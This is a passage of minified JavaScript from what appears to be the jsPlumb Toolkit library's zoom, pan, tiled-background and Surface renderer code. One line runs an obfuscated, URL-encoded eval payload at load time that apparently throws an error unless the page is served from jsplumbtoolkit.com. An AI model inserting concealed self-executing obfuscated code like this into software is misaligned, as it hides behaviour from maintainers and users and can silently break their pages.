            var c = Xa(), d = Va(s, a - c[0], b - c[1], null, !0);
            return i && i.pan(), kb && kb.pan(), d
        }, this.applyZoomToElement = function (a, b) {
            b = b || da, Ha("transform", "scale(" + b + ")", a)
        }, this.setTransformOriginForElement = function (a, b) {
            Ha("transformOrigin", b[0] + " " + b[1], a)
        }, this.getTransformOrigin = function () {
            return ea
        }, this.floatElement = function (a, b) {
            null != a && (a.style.position = "absolute", a.style.left = b[0] + "px", a.style.top = b[1] + "px", u.appendChild(a))
        };
        var ib = {}, jb = function (a) {
            var b = o.getApparentCanvasLocation();
            for (var c in ib) if (ib.hasOwnProperty(c)) {
                if (null != a && a !== c) continue;
                var d = ib[c], e = function (a, c) {
                    d[a] && (b[c] / da + d.pos[c] < 0 ? d.el.style[a] = -b[c] / da + "px" : d.el.style[a] = d.pos[c] + "px")
                };
                e("left", 0), e("top", 1)
            }
        }, kb = {pan: jb};
        this.fixElement = function (b, c, d) {
            if (null != b) {
                c = c || {};
                var e = a.id(b);
                ib[e] = {
                    el: b,
                    left: c.left,
                    top: c.top,
                    pos: d
                }, b.style.position = "absolute", b.style.left = d[0] + "px", b.style.top = d[1] + "px", s.appendChild(b), jb(e)
            }
        }, this.findIntersectingNodes = function (b, c, d, e, f) {
            var g, h = this.getApparentCanvasLocation(), i = a.offset(u), j = u.scrollLeft, k = u.scrollTop, l = [],
                m = {x: b[0], y: b[1], w: c[0], h: c[1]}, n = d ? Biltong.encloses : Biltong.intersects,
                o = [i.left + h[0] - j, i.top + h[1] - k];
            if (f = f || oa, Array.isArray(f)) {
                var p = {};
                for (g = 0; g < f.length; g++) p[jsPlumbUtil.isString(f[g]) ? f[g] : jsPlumb.getId(f[g])] = f[g];
                f = p
            }
            for (g in f) if (!qa[g]) {
                var q = oa[g];
                if (q) {
                    var r = {x: o[0] + q[0][0] * da, y: o[1] + q[0][1] * da, w: q[1] * da, h: q[2] * da};
                    n(m, r) && (null == e || e(g, pa[g], r)) && l.push({id: g, el: pa[g], r: r})
                }
            }
            return l
        }, this.findNearbyNodes = function (a, b, c, d) {
            var e = [];
            if (!c || this.isInViewport(a[0], a[1])) {
                e = this.findIntersectingNodes([a[0] - b, a[1] - b], [2 * b, 2 * b], !1, d);
                var f = this.mapLocation(a[0], a[1]);
                e.sort(function (a, b) {
                    var c = [a.x + a.w / 2, a.y + a.h / 2], d = [b.x + b.w / 2, b.y + b.h / 2],
                        e = Biltong.lineLength(f, c), g = Biltong.lineLength(f, d);
                    return e < g ? -1 : e > g ? 1 : 0
                })
            }
            return e
        }, this.isInViewport = function (b, c) {
            var d = a.offset(u), e = a.width(u), f = a.height(u);
            return d.left <= b && b <= d.left + e && d.top <= c && c <= d.top + f
        }, this.getElementPositions = function () {
            return oa
        }, this.setFilter = function (a) {
            $ = a || function (a) {
                return !1
            }
        }, this.setWheelFilter = function (a) {
            I = a || function (a) {
                return !0
            }
        }, this.setBackground = function (a) {
            var b = a.type || "simple", d = {simple: c, tiled: "absolute" === a.tiling ? f : e};
            i = new d[b]({
                canvas: s,
                viewport: u,
                getWidth: _,
                getHeight: aa,
                url: a.url,
                zoomWidget: o,
                onBackgroundReady: a.onBackgroundReady,
                options: a,
                img: a.img,
                resolver: a.resolver
            })
        }, a.background && this.setBackground(a.background), this.getBackground = function () {
            return i
        }, this.destroy = function () {
            a.bind(document, "mouseup", Da);
            for (var b = 0; b < ya.length; b++) ya[b].parentNode.removeChild(ya[b])
        }
    };
    var c = function (a) {
        var b = a.canvas, c = a.onBackgroundReady || function () {
        }, d = new Image;
        d.onload = function () {
            b.style.backgroundImage = "url('" + d.src + "')", b.style.backgroundRepeat = "no-repeat", b.style.width = d.width + "px", b.style.height = d.height + "px", c(this)
        }, d.src = a.img ? a.img.src : a.url, this.owns = function (a) {
            return a === b
        }, this.getWidth = function () {
            return d.width || 0
        }, this.getHeight = function () {
            return d.height || 0
        }, this.setZoom = this.pan = function (a) {
        }
    }, d = function (a) {
        var b = this, c = a.canvas, d = a.viewport;
        if (null == a.options.maxZoom) throw new TypeError("Parameter `maxZoom` not set; cannot initialize TiledBackground");
        if (!a.options.tileSize) throw new TypeError("Parameter `tileSize not set; cannot initialize TiledBackground. It should be an array of [x,y] values.");
        if (!a.options.width || !a.options.height) throw new TypeError("Parameters `width` and `height` must be set");
        for (var e = function (c) {
            var d = document.createElement("div");
            d.style.position = "relative", d.style.height = "100%", d.style.width = "100%", d.style.display = "none", a.canvas.appendChild(d), this.zoom = c;
            var e = b.getTileSpecs(c), f = [], g = function (b, c, d) {
                return a.url.replace("{z}", b).replace("{x}", c).replace("{y}", d)
            }, h = function (b, c, d) {
                return null == a.resolver ? g(b, c, d) : a.resolver(b, c, d)
            };
            this.apparentZoom = Math.min(e[2], e[3]), this.setActive = function (a) {
                d.style.display = a ? "block" : "none"
            }, this.xTiles = e[0], this.yTiles = e[1];
            for (var i = 0; i < this.xTiles; i++) {
                f[i] = f[i] || [];
                for (var j = 0; j < this.yTiles; j++) {
                    var k = document.createElement("img");
                    k._tiledBg = !0, k.className = "jtk-surface-tile", k.ondragstart = function () {
                        return !1
                    }, d.appendChild(k), k.style.position = "absolute", k.style.opacity = 0, f[i][j] = [k, new Image, !1]
                }
            }
            var l = Math.pow(2, a.options.maxZoom - c) * a.options.tileSize[0],
                m = Math.pow(2, a.options.maxZoom - c) * a.options.tileSize[1];
            this.scaledImageSize = l, this.scaledImageSizeH = m;
            var n = function (a, b, d, e) {
                a.style.left = d * l + "px", a.style.top = e * m + "px", a.style.width = l + "px", a.style.height = m + "px", b.onload = function () {
                    a.setAttribute("src", b.src), a.style.opacity = 1
                }, b.src = h(c, d, e)
            };
            this.ensureLoaded = function (a, b, c, d) {
                for (var e = a; e <= c; e++) for (var g = b; g <= d; g++) null != f[e] && null != f[e][g] && (f[e][g][2] || (n(f[e][g][0], f[e][g][1], e, g), f[e][g][2] = !0))
            }
        }.bind(this), f = [], g = null, h = 0; h <= a.options.maxZoom; h++) f.push(new e(h));
        c.style.width = a.options.width + "px", c.style.height = a.options.height + "px";
        var i, j = function () {
            if (i <= f[0].apparentZoom) return 0;
            if (i >= f[f.length - 1].apparentZoom) return f.length - 1;
            for (var a = f.length - 1; a > 0; a--) if (f[a].apparentZoom >= i && i >= f[a - 1].apparentZoom) return a
        }, k = function (a) {
            var b = f[a];
            null != g && g !== b && g.setActive(!1), b.setActive(!0), g = b
        }, l = function () {
            var b = a.zoomWidget.getApparentCanvasLocation(), c = a.getWidth(d), e = a.getHeight(d),
                f = g.scaledImageSize * i, h = g.scaledImageSizeH * i,
                j = b[0] < 0 ? Math.floor(-b[0] / f) : b[0] < c ? 0 : null,
                k = b[1] < 0 ? Math.floor(-b[1] / h) : b[1] < e ? 0 : null,
                l = Math.min(g.xTiles, Math.floor((c - b[0]) / f)), m = Math.min(g.yTiles, Math.floor((e - b[1]) / h));
            null != j && null != k && g.ensureLoaded(j, k, l, m)
        };
        this.getCurrentLayer = function () {
            return g
        }, this.getWidth = function () {
            return a.options.width
        }, this.getHeight = function () {
            return a.options.height
        };
        var m = a.options.panDebounceTimeout || 50, n = a.options.zoomDebounceTimeout || 120, o = function (a, b) {
            b = b || 150;
            var c = null;
            return function () {
                window.clearTimeout(c), c = window.setTimeout(a, b)
            }
        }, p = function () {
            k(j()), l()
        }, q = o(p, n), r = o(l, m);
        this.setZoom = function (a, b) {
            i = a, b ? p() : q()
        }, this.pan = r, this.owns = function (a) {
            return a === c || !0 === a._tiledBg
        }, this.setZoom(a.zoomWidget.getZoom(), !0), null != a.onBackgroundReady && setTimeout(a.onBackgroundReady, 0)
    }, e = function (a) {
        var b = a.options.width, c = a.options.height, e = a.options.tileSize;
        this.getTileSpecs = function (a) {
            var d = b > c ? 1 : b / c, f = c > b ? 1 : c / b, g = Math.pow(2, a + 1) * e[0] * d,
                h = Math.pow(2, a + 1) * e[1] * f;
            return [Math.ceil(g / e[0]), Math.ceil(h / e[1]), g / b, h / c]
        }, d.apply(this, arguments)
    }, f = function (a) {
        var b = a.options.maxZoom, c = a.options.width, e = a.options.height, f = a.options.tileSize;
        this.getTileSpecs = function (a) {
            var d = Math.pow(2, b - a), g = Math.ceil(c / d / f[0]), h = Math.ceil(e / d / f[1]);
            return [g, h, g * f[0] / c, h * f[1] / e]
        }, d.apply(this, arguments)
    }
}.call("undefined" != typeof window ? window : this), window_eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22!%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")), function () {
    "use strict";
    var a = this, b = a.jsPlumbToolkit, c = b.Renderers, d = a.jsPlumb, e = a.jsPlumbUtil, f = d.getSelector,
        g = b.Classes, h = b.Constants, i = b.Events;
    c.Surface = function (a) {
        function j(a) {
            return null == a ? null : "string" == typeof a ? this.getRenderedConnection(a) : a.constructor == d.Connection ? a : l.getRenderedConnection(a.getId())
        }

        function k() {
            if (!m.jsPlumb.startEditing) throw new TypeError("Connection editors not available.")
        }

        var l = this;
        c.Surface.SELECT = h.select, c.Surface.PAN = h.pan, c.Surface.DISABLED = h.disabled;
        var m = c.AbstractRenderer.apply(this, arguments);
        c.DOMElementAdapter.apply(this, arguments), this.getObjectInfo = m.getObjectInfo, a = a || {};
        var n, o = d.getElement(a.container), p = c.createElement({
                position: h.relative,
                width: h.nominalSize,
                height: h.nominalSize,
                left: 0,
                top: 0,
                clazz: g.SURFACE_CANVAS
            }, o), q = !0 !== a.directRender && !(!1 === a.elementsDraggable),
            r = !0 !== a.directRender && !0 === a.elementsDroppable, s = a.dragOptions || {}, t = a.dropOptions || {},
            u = a.stateHandle, v = !1 !== a.storePositionsInModel, w = a.modelLeftAttribute, x = a.modelTopAttribute,
            y = !0 === a.directRender, z = new ZoomWidget({
                viewport: o,
                canvas: p,
                domElement: m.jsPlumb.getElement,
                addClass: m.jsPlumb.addClass,
                removeClass: m.jsPlumb.removeClass,
                offset: this.getOffset,
                consumeRightClick: a.consumeRightClick,
                bind: function () {
                    m.jsPlumb.on.apply(m.jsPlumb, arguments)
                },
                unbind: function () {
                    m.jsPlumb.off.apply(m.jsPlumb, arguments)
                },
                width: function (a) {
                    return m.jsPlumb.getWidth(m.jsPlumb.getElement(a))
                },
                height: function (a) {
                    return m.jsPlumb.getHeight(m.jsPlumb.getElement(a))
                },
                id: m.jsPlumb.getId,
                animate: function () {
                    m.jsPlumb.animate.apply(m.jsPlumb, arguments)
                },
                dragEvents: {stop: d.dragEvents[h.stop], start: d.dragEvents[h.start], drag: d.dragEvents[h.drag]},
                background: a.background,
                padding: a.padding,
                panDistance: a.panDistance,
                directRender: y,
                enablePan: !y && !1 !== a.enablePan,
                enableWheelZoom: !y && !1 !== a.enableWheelZoom,
                wheelSensitivity: a.wheelSensitivity,
                wheelReverse: a.wheelReverse,
                wheelZoomMetaKey: a.wheelZoomMetaKey,
                wheelPan: a.wheelPan,
                enablePanButtons: !y && !1 !== a.enablePanButtons,
                enableAnimation: a.enableAnimation,
                clamp: a.clamp,
                clampZoom: a.clampZoom,
                clampToBackground: a.clampToBackground,
                clampToBackgroundExtents: a.clampToBackgroundExtents,
                zoom: a.zoom,
                zoomRange: a.zoomRange,
                extend: m.jsPlumb.extend,
                events: {
                    pan: function (a, b, c, d, e) {
                        l.fire(i.pan, {x: a, y: b, zoom: c, oldZoom: d, event: e})
                    }, zoom: function (a, b, c, d, e) {
                        m.jsPlumb.setZoom(c), l.fire(i.zoom, {x: a, y: b, zoom: c, oldZoom: d, event: e})
                    }, mousedown: function () {
                        d.addClass(o, g.SURFACE_PANNING), d.addClass(document.body, g.SELECT_DEFEAT)
                    }, mouseup: function () {
                        d.removeClass(o, g.SURFACE_PANNING), d.removeClass(document.body, g.SELECT_DEFEAT)
                    }
                }
            }), A = [], B = a.lassoSelectionFilter, C = !1 !== a.autoExitSelectMode, D = new b.Widgets.Lasso({
                on: function () {
                    m.jsPlumb.on.apply(m.jsPlumb, arguments)
                }, off: function () {
                    m.jsPlumb.off.apply(m.jsPlumb, arguments)
                }, invert: a.lassoInvert, pageLocation: z.pageLocation, canvas: o, onStart: function () {
                    l.setHoverSuspended(!0), A.length = 0
                }, onSelect: function (a, b, c, d) {
                    function e(a) {
                        return a.el.jtk.node || a.el.jtk.group
                    }

                    m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(), m.toolkit.clearSelection(), d && A.length > 0 && m.toolkit.removeFromSelection(A);
                    for (var f = [], g = z.findIntersectingNodes(a, b, !c[0]), h = g.length, i = 0; i < h; i++) null != B && !1 === B(e(g[i])) || (f.push(e(g[i])), m.jsPlumb.addToDragSelection && m.jsPlumb.addToDragSelection(g[i].el));
                    A = f, m.toolkit.addToSelection(f, d)
                }, onEnd: function () {
                    l.setHoverSuspended(!1), C && l.setMode(h.pan), l.fire("lasso:end")
                }, filter: a.lassoFilter
            }), E = {
                pan: function () {
                    D.setEnabled(!1), z.setEnabled(!0)
                }, select: function () {
                    m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(), D.setEnabled(!0), z.setEnabled(!1)
                }, disabled: function () {
                    m.jsPlumb.clearDragSelection && m.jsPlumb.clearDragSelection(), D.setEnabled(!0), z.setEnabled(!1)
                }
            }, F = a.mode || h.pan;
        l.bind(i.relayout, function (a) {
            z.relayout(l.getLayout().getExtents(), !0)
        }), l.bind(i.nodeRemoved, function (a) {
            z.remove(a.el)
        }), m.bindToToolkit(i.graphClearStart, function () {
            z.reset()
        }), m.bindToToolkit(i.dataLoadStart, function () {
            z.setSuspendRendering(!0)
        }), m.bindToToolkit(i.dataAppendStart, function () {
            z.setSuspendRendering(!0)
        }), m.bindToToolkit(i.dataLoadEnd, function () {
            z.setSuspendRendering(!1), n && n.setVisible(!0), a.zoomToFit && l.zoomToFit()
        }), m.bindToToolkit(i.dataAppendEnd, function () {
            z.setSuspendRendering(!1)
        }), m.bindToToolkit(i.groupMemberAdded, function (a) {
            var b = m.nodeMap()[a.node.id];
            b && z.suspend(b)
        }), m.bindToToolkit(i.groupMemberRemoved, function (a) {
            var b = m.nodeMap()[a.node.id];
            b && z.restore(b)
        }), m.jsPlumb.setContainer(p), d.addClass(o, g.SURFACE), y && d.addClass(o, g.SURFACE_DIRECT), !1 === a.enablePan && d.addClass(o, g.SURFACE_NO_PAN);
        var G = function (a, b) {
            var c = function (a) {
                var c = a.srcElement || a.target;
                c != o && c != p || l.fire(b, a)
            };
            m.jsPlumb.on(p, a, c), m.jsPlumb.on(o, a, c)
        };
        G(i.tap, i.canvasClick), G(i.dblclick, i.canvasDblClick);
        var H = null;
        m.makeDraggable = function (a, b) {
            if (q) {
                var c = d.getElement(a), f = m.jsPlumb.getId(c), j = m.jsPlumb.extend({}, s), k = d.dragEvents[h.stop],
                    n = d.dragEvents[h.start], p = function (a) {
                        var b = d.getDragObject(a);
                        return {node: d.getElement(b).jtk.node, el: b}
                    };
                null != b && m.jsPlumb.extend(j, b), j[n] = e.wrap(j[n], function () {
                    if (z.isPinchZooming()) return !1;
                    H = z.getBoundsInfo();
                    var a = p(arguments);
                    a.elementId = f, a.pos = d.getAbsolutePosition(c), a.domEl = c, d.addClass(o, g.SURFACE_ELEMENT_DRAGGING), l.fire(i.nodeMoveStart, a)
                }), j[k] = e.wrap(j[k], function (a) {
                    for (var b = function (b) {
                        d.removeClass(o, g.SURFACE_ELEMENT_DRAGGING);
                        try {
                            var c = {
                                el: b[0],
                                node: b[0].jtk.node || b[0].jtk.group,
                                pos: [b[1].left, b[1].top],
                                e: a.e,
                                eventPosition: a.pos
                            };
                            if (!b[0]._droppedOnGroup) {
                                var e = c.node.group ? c.node.group.layout : l.getLayout();
                                j.magnetize && !c.node.group ? c.pos = e.setMagnetizedPosition(c.node.id, c.pos[0], c.pos[1], !0) : e.setPosition(c.node.id, c.pos[0], c.pos[1], !0), z.positionChanged(b[0]), !1 !== v && (l.storePositionInModel({
                                    id: c.node.id,
                                    leftAttribute: w,
                                    topAttribute: x
                                }), m.toolkit.fire(i.nodeUpdated, {node: c.node}, null))
                            }
                            l.fire(i.nodeMoveEnd, c)
                        } catch (a) {
                            jsPlumbUtil.log("could not process dragged node", a)
                        }
                        delete b[0]._droppedOnGroup
                    }, c = 0; c < a.selection.length; c++) b(a.selection[c])
                }), j.canDrag = function () {
                    return !D.isActive()
                }, j.force = !0, m.jsPlumb.draggable(c, j, !1, m.jsPlumb)
            }
        }, m.makeDroppable = function (a, b) {
            if (r) {
                var c = d.getElement(a), f = m.jsPlumb.extend({}, t);
                null != b && m.jsPlumb.extend(f, b), f[h.drop] = e.wrap(f[h.drop], function (a) {
                    var b = {
                        source: a.drag.el.jtk.node,
                        sourceElement: a.drag.el,
                        target: a.drop.el.jtk.node,
                        targetElement: a.drop.el,
                        e: a.e
                    };
                    l.fire(i.nodeDropped, b)
                }), m.jsPlumb.droppable(c, f)
            }
        }, m.doImport = function (b) {
            a.jsPlumbInstance.setContainer(p);
            var c = a.jsPlumbInstance.getManagedElements();
            for (var d in c) {
                var e = c[d].el;
                I(e, d)
            }
        };
        var I = this.importNode = function (b, c) {
            var e = a.jsPlumbInstance.getOffset(b), f = a.jsPlumbInstance.getId(b);
            b.style.left = e.left + h.px, b.style.top = e.top + h.px, d.addClass(b, g.NODE), z.add(b, f, [e.left, e.top], !1), this.getLayout().setPosition(c, e.left, e.top), d.isAlreadyDraggable(b) && m.makeDraggable(b), m.nodeMap()[c] = b, m.reverseNodeMap()[f] = b.jtk.node, null != n && n.registerNode({
                el: b,
                node: b.jtk.node,
                pos: d.getAbsolutePosition(b)
            })
        }.bind(this);
        this.zoomToSelection = function (a) {
            function b() {
                return a.filter ? m.toolkit.filter(a.filter) : m.toolkit.getSelection()
            }

            a = a || {};
            var c = a.selection || b(), d = [];
            c.eachNode(function (a, b) {
                d.push(m.getElement(b.id))
            }), c.eachGroup(function (a, b) {
                d.push(m.getElement(b.id))
            }), d.length > 0 && z.zoomToElements({
                elements: d,
                fill: a.fill,
                doNotZoomIfVisible: a.doNotZoomIfVisible,
                doNotAnimate: a.doNotAnimate
            })
        }, this.animateToSelection = function (a) {
            this.zoomToSelection(jsPlumb.extend(a || {}, {doNotAnimate: !1}))
        }, this.zoomToBackground = z.zoomToBackground, this.zoomToVisible = function (a) {
            a = d.extend({}, a || {}), a.selection = m.toolkit.filter(function (a) {
                return "Node" === a.objectType && this.isVisible(a)
            }.bind(this)), this.zoomToSelection(a)
        }, this.zoomToVisibleIfNecessary = function (a) {
            var b = d.extend(a || {});
            b.doNotZoomIfVisible = !0, this.zoomToVisible(b)
        }, this.zoomToFit = z.zoomToFit, this.zoomToFitIfNecessary = z.zoomToFitIfNecessary, this.centerOn = function (a, b) {
            var c = this.getObjectInfo(a);
            c && c.el && z.centerOn(c.el, b)
        }, this.centerOnHorizontally = function (a) {
            this.centerOn(a, {vertical: !1})
        }, this.centerOnVertically = function (a) {
            this.centerOn(a, {horizontal: !1})
        }, this.centerOnAndZoom = function (a, b) {
            var c = this.getObjectInfo(a);
            c && c.el && z.centerOnAndZoom(c.el, b)
        }, this.centerContent = z.centerContent, this.centerContentHorizontally = z.centerContentHorizontally, this.centerContentVertically = z.centerContentVertically, this.getViewportCenter = z.getViewportCenter, this.setViewportCenter = z.setViewportCenter, this.setSize = function (a, b, c) {
            var d = l.getRenderedNode(a) || l.getRenderedGroup(a);
            if (null != d) {
                var e = d.jtk.group || d.jtk.node;
                if (e) {
                    (e.group ? e.group.layout : l.getLayout()).setSize(e.getFullId(), [b, c])
                }
                z.setSize(m.jsPlumb.getId(d), b, c)
            }
        }, this.setStateHandle = function (a) {
            u = a
        }, this.getStateHandle = function () {
            return u
        }, this.setLassoSelectionFilter = function (a) {
            B = a
        }, this.getApparentCanvasLocation = z.getApparentCanvasLocation, this.setApparentCanvasLocation = z.setApparentCanvasLocation, this.getBoundsInfo = z.getBoundsInfo, this.setZoom = z.setZoom, this.setZoomRange = z.setZoomRange, this.getZoomRange = z.getZoomRange, this.getZoom = z.getZoom, this.nudgeZoom = z.nudgeZoom, this.nudgeWheelZoom = z.nudgeWheelZoom, this.pageLocation = z.pageLocation, this.getPan = z.getPan, this.pan = z.pan, this.setPan = z.setPan, this.startEditing = function (a, b) {
            k();
            var c = j(a);
            null != c && m.jsPlumb.startEditing(c, b)
        }, this.stopEditing = function (a) {
            k();
            var b = j(a);
            null != b && m.jsPlumb.stopEditing(b)
        }, this.clearEdits = function (a) {
            k();
            var b = j(a);
            null != b && m.jsPlumb.clearEdits(b)
        }, this.setPanAndZoom = function (a, b, c, d) {
            this.setPan(a, b, !d), this.setZoom(c, !d)
        }, this.setPanFilter = function (a) {
            z.setFilter(a ? function (b, c) {
                return "function" == typeof a ? a.apply(a, [c]) : e.matchesSelector(b, a)
            } : null)
        }, this.setWheelFilter = function (a) {
            z.setWheelFilter(function (b) {
                if (a) {
                    var c = b.srcElement || b.target;
                    return !e.matchesSelector(c, a)
                }
                return !0
            })
        }, this.setWheelFilter(a.wheelFilter), this.setPanFilter(a.panFilter), this.mapLocation = z.mapLocation, this.mapEventLocation = z.mapEventLocation, this.findNearbyNodes = z.findNearbyNodes, this.findIntersectingNodes = z.findIntersectingNodes, this.findIntersectingGroups = function (a, b, c, d) {
            return z.findIntersectingNodes(a, b, c, d, m.reverseGroupMap())
        }, this.isInViewport = z.isInViewport, this.getViewportCenter = z.getViewportCenter, this.positionElementAt = z.positionElementAt, this.positionElementAtEventLocation = z.positionElementAtEventLocation, this.positionElementAtPageLocation = z.positionElementAtPageLocation, this.setFilter = z.setFilter, this.floatElement = z.floatElement, this.fixElement = z.fixElement;
        var J = this.setPosition, K = this.animateToPosition, L = function (a, b, c) {
            a && (z.positionChanged(a.el, [b, c]), l.fire(i.nodeMoveEnd, {
                el: a.el,
                id: a.id,
                pos: [b, c],
                node: a.obj || (a.el.jtk ? a.el.jtk.node || a.el.jtk.group : {}),
                bounds: z.getBoundsInfo()
            }))
        };
        this.setPosition = function (a, b, c, d, e) {
            var f = J.apply(this, arguments);
            L(f, b, c)
        }, this.animateToPosition = function (a, b, c, d) {
            var e = K.apply(this, arguments);
            L(e, b, c)
        }, this.tracePath = function (a) {
            var b = a.path || function () {
                var b = m.getObjectInfo(a.source), c = m.getObjectInfo(a.target);
                return m.toolkit.getPath({source: b, target: c})
            }();
            if (b.exists()) {
                for (var c = function (b, c) {
                    this.fire(b, {edge: c.edge, connection: c, options: a.options})
                }.bind(this), e = [], f = null, g = null, h = b.path.path.length, i = 1; i < h; i++) {
                    var j = b.path.path[i].vertex.id, k = b.path.previous[j], l = !0, n = b.path.path[i].edge;
                    null != k && (l = k === n.source), f = m.getConnectionForEdge(n), g = f.animateOverlay(a.overlay, d.extend(a.options || {}, {
                        previous: g,
                        isFinal: i === h - 1,
                        forwards: l
                    })), e.push({handler: g, connection: f})
                }
                return e.length > 0 && (e[0].handler.bind(jsPlumbToolkit.Events.startOverlayAnimation, function () {
                    c(jsPlumbToolkit.Events.startOverlayAnimation, e[0].connection)
                }), e[e.length - 1].handler.bind(jsPlumbToolkit.Events.endOverlayAnimation, function () {
                    c(jsPlumbToolkit.Events.endOverlayAnimation, e[e.length - 1].connection)
                })), !0
            }
            return m.toolkit.isDebugEnabled() && jsPlumbUtil.log("Cannot trace non existent path"), !1
        }, this.getNodePositions = function () {
            var a = {}, b = z.getElementPositions();
            for (var c in b) {
                var d = m.getNodeForElementId(c) || m.getGroupForElementId(c);
                d && (a[d.id] = [b[c][0][0], b[c][0][1]])
            }
            return a
        }, this.append = function (a, b, c, d) {
            p.appendChild(a), c && (c = [c.left, c.top]), z.add(a, b, c, d)
        }, this.nodeAppendedToGroup = function (a, b, c) {
            z.suspend(a)
        }, this.nodeRemovedFromGroup = function (a) {
            z.restore(a)
        };
        var M = this.setLayout;
